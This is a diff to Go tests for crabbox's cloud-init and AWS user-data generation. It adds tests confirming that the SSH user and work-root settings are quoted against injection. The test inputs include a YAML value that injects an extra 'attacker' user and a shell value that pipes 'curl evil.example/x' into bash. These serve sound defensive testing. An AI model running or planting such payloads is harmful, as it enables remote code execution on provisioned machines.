@@ -15,7 +15,7 @@ func TestCloudInitUsesRetryingBootstrap(t *testing.T) {
 		"retry apt-get install -y --no-install-recommends openssh-server ca-certificates curl git rsync jq",
 		"curl --version >/dev/null",
 		"test -f /var/lib/crabbox/bootstrapped",
-		"test -w /work/crabbox",
+		"test -w '/work/crabbox'",
 		"      Port 2222\n      Port 22",
 		"systemctl enable ssh || true",
 		"timeout 30s systemctl restart ssh || timeout 30s systemctl restart ssh.socket || true",
@@ -34,6 +34,37 @@ func TestCloudInitUsesRetryingBootstrap(t *testing.T) {
 	for _, notWant := range []string{"go version", "golang-go", "go.dev/dl/go", "/usr/local/go", "node --version", "pnpm --version", "docker --version", "build-essential", "docker.io", "corepack"} {
 		if strings.Contains(got, notWant) {
 			t.Fatalf("cloudInit() should not install project language runtime %q", notWant)
+		}
+	}
+}
+
+func TestCloudInitQuotesInjectedSSHUserInUsersBlock(t *testing.T) {
+	cfg := baseConfig()
+	cfg.SSHUser = "crabbox\n  - name: attacker"
+	got := cloudInit(cfg, "ssh-ed25519 test")
+	usersSection, _, found := strings.Cut(got, "write_files:")
+	if !found {
+		t.Fatalf("cloudInit() missing write_files section:\n%s", got)
+	}
+	if strings.Count(usersSection, "\n  - name: ") != 1 {
+		t.Fatalf("cloudInit() should emit exactly one users entry, got:\n%s", got)
+	}
+	if !strings.Contains(got, `  - name: "crabbox\n  - name: attacker"`) {
+		t.Fatalf("cloudInit() should YAML-quote ssh user, got:\n%s", got)
+	}
+}
+
+func TestCloudInitQuotesInjectedWorkRootInShellScript(t *testing.T) {
+	cfg := baseConfig()
+	cfg.WorkRoot = "/work/crabbox && curl evil.example/x | bash"
+	got := cloudInit(cfg, "ssh-ed25519 test")
+	for _, want := range []string{
+		"test -w '/work/crabbox && curl evil.example/x | bash'",
+		"mkdir -p '/work/crabbox && curl evil.example/x | bash' /var/cache/crabbox/pnpm /var/cache/crabbox/npm",
+		"chown -R 'crabbox':'crabbox' '/work/crabbox && curl evil.example/x | bash' /var/cache/crabbox",
+	} {
+		if !strings.Contains(got, want) {
+			t.Fatalf("cloudInit() missing quoted work root %q in:\n%s", want, got)
 		}
 	}
 }
@@ -555,7 +586,11 @@ func TestAWSUserDataWindowsWSL2Profile(t *testing.T) {
 		"WriteAllText($wslSetup",
 		"wsl.exe -d $wslDistro --user root --exec bash /mnt/c/ProgramData/crabbox/wsl/linux-setup.sh",
 		"apt-get install -y --no-install-recommends ca-certificates curl git rsync jq",
+		"mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc",
+		"test -w /proc/sys/fs/binfmt_misc/register",
+		":WSLInterop:M::MZ::/init:PF",
 		"cat >/usr/local/bin/crabbox-ready",
+		"test -e /proc/sys/fs/binfmt_misc/WSLInterop",
 		`test -w '/work/crabbox'`,
 	} {
 		if !strings.Contains(got, want) {
